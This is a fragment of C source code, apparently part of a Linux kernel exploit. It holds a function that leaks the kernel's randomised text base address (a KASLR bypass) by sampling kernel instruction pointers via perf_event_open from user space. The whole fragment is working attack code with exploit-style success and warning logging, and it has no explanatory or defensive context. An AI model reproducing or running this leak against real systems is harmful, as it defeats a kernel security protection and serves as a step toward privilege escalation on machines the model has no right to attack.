  return value >= DIRECT_MAP_BASE && value < DIRECT_MAP_END;
}

/* KASLR TEXT base via perf kernel-IP sampling */
#define PERF_LEAK_ALIGN 0x200000ULL
#define PERF_LEAK_MMAP_PAGES 8

uint64_t perf_leak_text_base(void) {
    /* perf_event_paranoid > 1 blocks kernel samples for unprivileged callers. */
    int pfd = open("/proc/sys/kernel/perf_event_paranoid", O_RDONLY | O_CLOEXEC);
    if (pfd >= 0) {
        char pbuf[16];
        ssize_t pn = read(pfd, pbuf, sizeof(pbuf) - 1);
        close(pfd);
        if (pn > 0) {
            pbuf[pn] = 0;
            if (atoi(pbuf) > 1) {
                pr_warning("perf text-base perf_event_paranoid too high\n");
                return 0;
            }
        }
    }

    struct perf_event_attr pe;
    memset(&pe, 0, sizeof(pe));
    pe.type = PERF_TYPE_SOFTWARE;
    pe.config = PERF_COUNT_SW_CPU_CLOCK;
    pe.size = sizeof(pe);
    pe.sample_period = 1;
    pe.sample_type = PERF_SAMPLE_IP;
    pe.exclude_user = 1;
    pe.exclude_hv = 1;
    pe.disabled = 1;
    pe.wakeup_events = 1;

    int fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
    if (fd < 0) {
        pe.sample_period = 100000;
        fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
    }
    if (fd < 0) {
        pr_warning("perf text-base perf_event_open errno=%d\n", errno);
        return 0;
    }

    size_t mmap_size = (size_t)(1 + PERF_LEAK_MMAP_PAGES) * (size_t)PAGE_SIZE;
    void *mmap_buf = mmap(NULL, mmap_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (mmap_buf == MAP_FAILED) {
        pr_warning("perf text-base mmap errno=%d\n", errno);
        close(fd);
        return 0;
    }

    struct perf_event_mmap_page *header = (struct perf_event_mmap_page *)mmap_buf;
    uint64_t min_kip = ~(uint64_t)0;
    int kernel_samples = 0;

    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);

    for (volatile long i = 0; i < 500000; i++) {
        if ((i % 10000) == 0) {
            sched_yield();
        }
    }

    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

    uint64_t data_tail = header->data_tail;
    uint64_t data_head = header->data_head;
    __sync_synchronize();
    uint64_t data_size = (uint64_t)PERF_LEAK_MMAP_PAGES * (uint64_t)PAGE_SIZE;
    uint8_t *base = (uint8_t *)mmap_buf + PAGE_SIZE;

    while (data_tail < data_head) {
        struct perf_event_header *ev = (struct perf_event_header *)(base + (data_tail % data_size));
        if (ev->size == 0) break;
        if (data_tail + ev->size > data_head) break;

        if (ev->type == PERF_RECORD_SAMPLE && (ev->misc & PERF_RECORD_MISC_KERNEL)) {
            uint64_t ip = *(uint64_t *)((uint8_t *)ev + sizeof(*ev));
            if (ip >= KIMAGE_TEXT_BASE && ip < min_kip) {
                min_kip = ip;
            }
            kernel_samples++;
        }
        data_tail += ev->size;
    }

    header->data_tail = data_tail;
    munmap(mmap_buf, mmap_size);
    close(fd);

    if (kernel_samples == 0 || min_kip == ~(uint64_t)0) {
        pr_warning("perf text-base no kernel samples collected\n");
        return 0;
    }

    uint64_t text_base = (min_kip & ~(PERF_LEAK_ALIGN - 1)) + P0_KERNEL_PHYS_DELTA;
    if (text_base < KIMAGE_TEXT_BASE) {
        pr_warning("perf text-base out of range: %016llx\n", (unsigned long long)text_base);
        return 0;
    }

    pr_success("perf text-base pid=%d samples=%d min_kip=%016llx text_base=%016llx\n",
               getpid(), kernel_samples, (unsigned long long)min_kip, (unsigned long long)text_base);
    return text_base;
}
